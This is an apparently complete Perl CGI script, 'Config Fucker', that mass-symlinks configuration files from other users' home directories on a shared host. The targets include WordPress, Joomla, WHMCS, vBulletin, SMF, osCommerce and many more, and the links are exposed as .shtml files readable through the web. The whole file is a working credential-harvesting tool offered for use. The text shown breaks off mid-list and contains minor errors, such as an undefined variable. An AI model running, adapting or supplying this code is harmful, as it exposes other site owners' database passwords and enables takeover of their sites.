#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Config Fucker By X-1n73ct</title>
<link rel="shortcut icon" href="http://png-3.findicons.com/files/icons/1935/red_gems_vol_2/128/r2_dragon.png"/>
<style type="text/css">
body {
	background-color: #000000;

}
.newStyle1 {
 font-family: Tahoma;
 font-size: x-small;
 font-weight: bold;
 color: #00ff00;
  text-align: center;
}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$domain=$msr."/".$user;
$domain=~s/\n//g;
symlink('/home/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.shtml') ; 
 symlink('/home/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.shtml') ; 
 symlink('/home/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.shtml') ;
 symlink('/home/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.shtml') ;
 symlink('/home/'.$user.'/public_html/config.php',$domain.'~~>Other.shtml') ;
 symlink('/home/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.shtml');
 symlink('/home/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.shtml') ;
 symlink('/home/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.shtml') ; 
 symlink('/home/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.shtml') ; 
 symlink('/home/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.shtml') ; 
 symlink('/home/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.shtml') ;
 symlink('/home/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.shtml') ;
 symlink('/home/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.shtml');
 symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.shtml') ; 
 symlink('/home/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.shtml');
 symlink('/home/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.shtml');
 symlink('/home/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.shtml');
 symlink('/home/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.shtml'); 
 symlink('/home/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.shtml');
 symlink('/home/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.shtml'); 
 symlink('/home/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.shtml');
 symlink('/home/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.shtml');
 symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.shtml');
 symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.shtml');
 symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.shtml');
 symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.shtml');
 symlink('/home/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.shtml');
 symlink('/home/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.shtml');
 symlink('/home/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.shtml');
 symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.shtml');
 symlink('/home/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.shtml');
 symlink('/home/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.shtml');
 symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.shtml');
 symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.shtml');
 symlink('/home/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.shtml');
 symlink('/home/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.shtml');
 symlink('/home/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.shtml') ; 
 symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.shtml');
 symlink('/home/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.shtml');
 symlink('/home/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.shtml');
 symlink('/home/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.shtml');
 symlink('/home/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.shtml');
 symlink('/home/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.shtml');
 symlink('/home/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml') ;
 symlink('/home/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.shtml');
 symlink('/home/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.shtml');
 symlink('/home/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.shtml');
 symlink('/home/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.shtml');
 symlink('/home/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.shtml');
 symlink('/home/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.shtml');
 symlink('/home/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.shtml');
 symlink('/home/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.shtml');
 symlink('/home/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml');
 symlink('/home/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.shtml');
 symlink('/home/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.shtml');
 symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.shtml');
 symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.shtml');
 symlink('/home/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.shtml');
 symlink('/home/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.shtml');
 symlink('/home/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.shtml');
 symlink('/home/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.shtml');
 symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.shtml'); 
 symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.shtml'); 
 symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.shtml'); 
 symlink('/home/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.shtml');
 symlink('/home/'.$user.'/public_html/Settings.php',$domain.'~~>smf.shtml'); 
 symlink('/home/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.shtml'); 
 symlink('/home/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.shtml'); 
 symlink('/home/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.shtml'); 
 symlink('/home/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.shtml');
 symlink('/home/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.shtml');
 symlink('/home/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.shtml');
 symlink('/home/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.shtml');
 symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.shtml');
 symlink('/home/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.shtml');
 symlink('/home/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.shtml');
 symlink('/home/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.shtml');
 symlink('/home/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.shtml'); 
 symlink('/home/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.shtml');
 symlink('/home/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.shtml');
 symlink('/home/'.$user.'/public_html/e107_config.php',$domain.'~>e107.shtml');
 symlink('/home/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.shtml');
 symlink('/home2/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.shtml') ; 
 symlink('/home2/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.shtml') ; 
 symlink('/home2/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.shtml') ;
 symlink('/home2/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.shtml') ;
 symlink('/home2/'.$user.'/public_html/config.php',$domain.'~~>Other.shtml') ;
 symlink('/home2/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.shtml');
 symlink('/home2/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.shtml') ;
 symlink('/home2/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.shtml') ; 
 symlink('/home2/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.shtml') ; 
 symlink('/home2/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.shtml') ; 
 symlink('/home2/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.shtml') ;
 symlink('/home2/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.shtml') ;
 symlink('/home2/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.shtml');
 symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.shtml') ; 
 symlink('/home2/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.shtml');
 symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.shtml');
 symlink('/home2/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.shtml');
 symlink('/home2/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.shtml'); 
 symlink('/home2/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.shtml');
 symlink('/home2/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.shtml'); 
 symlink('/home2/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.shtml');
 symlink('/home2/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.shtml');
 symlink('/home2/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.shtml');
 symlink('/home2/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.shtml');
 symlink('/home2/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.shtml');
 symlink('/home2/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.shtml');
 symlink('/home2/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.shtml');
 symlink('/home2/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.shtml');
 symlink('/home2/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.shtml');
 symlink('/home2/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.shtml');
 symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.shtml');
 symlink('/home2/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.shtml');
 symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.shtml');
 symlink('/home2/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.shtml');
 symlink('/home2/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.shtml');
 symlink('/home2/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.shtml');
 symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home2/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.shtml') ; 
 symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.shtml');
 symlink('/home2/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.shtml');
 symlink('/home2/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.shtml');
 symlink('/home2/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.shtml');
 symlink('/home2/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.shtml');
 symlink('/home2/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.shtml');
 symlink('/home2/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home2/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home2/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml') ;
 symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.shtml');
 symlink('/home2/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.shtml');
 symlink('/home2/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.shtml');
 symlink('/home2/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.shtml');
 symlink('/home2/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.shtml');
 symlink('/home2/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.shtml');
 symlink('/home2/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.shtml');
 symlink('/home2/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.shtml');
 symlink('/home2/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml');
 symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.shtml');
 symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.shtml');
 symlink('/home2/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.shtml');
 symlink('/home2/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.shtml');
 symlink('/home2/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.shtml');
 symlink('/home2/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.shtml');
 symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.shtml');
 symlink('/home2/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.shtml');
 symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.shtml'); 
 symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.shtml'); 
 symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.shtml'); 
 symlink('/home2/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.shtml');
 symlink('/home2/'.$user.'/public_html/Settings.php',$domain.'~~>smf.shtml'); 
 symlink('/home2/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.shtml'); 
 symlink('/home2/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.shtml'); 
 symlink('/home2/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.shtml'); 
 symlink('/home2/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.shtml');
 symlink('/home2/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.shtml');
 symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.shtml');
 symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.shtml');
 symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.shtml');
 symlink('/home2/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.shtml');
 symlink('/home2/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.shtml');
 symlink('/home2/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.shtml');
 symlink('/home2/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.shtml'); 
 symlink('/home2/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.shtml');
 symlink('/home2/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.shtml');
 symlink('/home2/'.$user.'/public_html/e107_config.php',$domain.'~>e107.shtml');
 symlink('/home2/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.shtml');
 symlink('/home3/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.shtml') ; 
 symlink('/home3/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.shtml') ; 
 symlink('/home3/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.shtml') ;
 symlink('/home3/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.shtml') ;
 symlink('/home3/'.$user.'/public_html/config.php',$domain.'~~>Other.shtml') ;
 symlink('/home3/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.shtml');
 symlink('/home3/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.shtml') ;
 symlink('/home3/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.shtml') ; 
 symlink('/home3/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.shtml') ; 
 symlink('/home3/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.shtml') ; 
 symlink('/home3/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.shtml') ;
 symlink('/home3/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.shtml') ;
 symlink('/home3/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.shtml');
 symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.shtml') ; 
 symlink('/home3/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.shtml');
 symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.shtml');
 symlink('/home3/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.shtml');
 symlink('/home3/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.shtml'); 
 symlink('/home3/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.shtml');
 symlink('/home3/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.shtml'); 
 symlink('/home3/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.shtml');
 symlink('/home3/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.shtml');
 symlink('/home3/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.shtml');
 symlink('/home3/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.shtml');
 symlink('/home3/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.shtml');
 symlink('/home3/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.shtml');
 symlink('/home3/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.shtml');
 symlink('/home3/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.shtml');
 symlink('/home3/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.shtml');
 symlink('/home3/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.shtml');
 symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.shtml');
 symlink('/home3/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.shtml');
 symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.shtml');
 symlink('/home3/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.shtml');
 symlink('/home3/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.shtml');
 symlink('/home3/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.shtml');
 symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home3/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.shtml') ; 
 symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.shtml');
 symlink('/home3/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.shtml');
 symlink('/home3/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.shtml');
 symlink('/home3/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.shtml');
 symlink('/home3/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.shtml');
 symlink('/home3/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.shtml');
 symlink('/home3/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home3/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home3/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml') ;
 symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.shtml');
 symlink('/home3/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.shtml');
 symlink('/home3/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.shtml');
 symlink('/home3/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.shtml');
 symlink('/home3/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.shtml');
 symlink('/home3/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.shtml');
 symlink('/home3/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.shtml');
 symlink('/home3/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.shtml');
 symlink('/home3/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml');
 symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.shtml');
 symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.shtml');
 symlink('/home3/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.shtml');
 symlink('/home3/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.shtml');
 symlink('/home3/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.shtml');
 symlink('/home3/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.shtml');
 symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.shtml');
 symlink('/home3/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.shtml');
 symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.shtml'); 
 symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.shtml'); 
 symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.shtml'); 
 symlink('/home3/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.shtml');
 symlink('/home3/'.$user.'/public_html/Settings.php',$domain.'~~>smf.shtml'); 
 symlink('/home3/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.shtml'); 
 symlink('/home3/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.shtml'); 
 symlink('/home3/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.shtml'); 
 symlink('/home3/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.shtml');
 symlink('/home3/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.shtml');
 symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.shtml');
 symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.shtml');
 symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.shtml');
 symlink('/home3/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.shtml');
 symlink('/home3/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.shtml');
 symlink('/home3/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.shtml');
 symlink('/home3/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.shtml'); 
 symlink('/home3/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.shtml');
 symlink('/home3/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.shtml');
 symlink('/home3/'.$user.'/public_html/e107_config.php',$domain.'~>e107.shtml');
 symlink('/home3/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.shtml');
 symlink('/home4/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.shtml') ; 
 symlink('/home4/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.shtml') ; 
 symlink('/home4/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.shtml') ;
 symlink('/home4/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.shtml') ;
 symlink('/home4/'.$user.'/public_html/config.php',$domain.'~~>Other.shtml') ;
 symlink('/home4/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.shtml');
 symlink('/home4/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.shtml') ;
 symlink('/home4/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.shtml') ; 
 symlink('/home4/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.shtml') ; 
 symlink('/home4/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.shtml') ; 
 symlink('/home4/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.shtml') ;
 symlink('/home4/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.shtml') ;
 symlink('/home4/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.shtml');
 symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.shtml') ; 
 symlink('/home4/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.shtml');
 symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.shtml');
 symlink('/home4/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.shtml');
 symlink('/home4/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.shtml'); 
 symlink('/home4/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.shtml');
 symlink('/home4/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.shtml'); 
 symlink('/home4/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.shtml');
 symlink('/home4/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.shtml');
 symlink('/home4/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.shtml');
 symlink('/home4/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.shtml');
 symlink('/home4/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.shtml');
 symlink('/home4/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.shtml');
 symlink('/home4/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.shtml');
 symlink('/home4/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.shtml');
 symlink('/home4/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.shtml');
 symlink('/home4/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.shtml');
 symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.shtml');
 symlink('/home4/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.shtml');
 symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.shtml');
 symlink('/home4/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.shtml');
 symlink('/home4/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.shtml');
 symlink('/home4/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.shtml');
 symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home4/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.shtml') ; 
 symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.shtml');
 symlink('/home4/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.shtml');
 symlink('/home4/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.shtml');
 symlink('/home4/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.shtml');
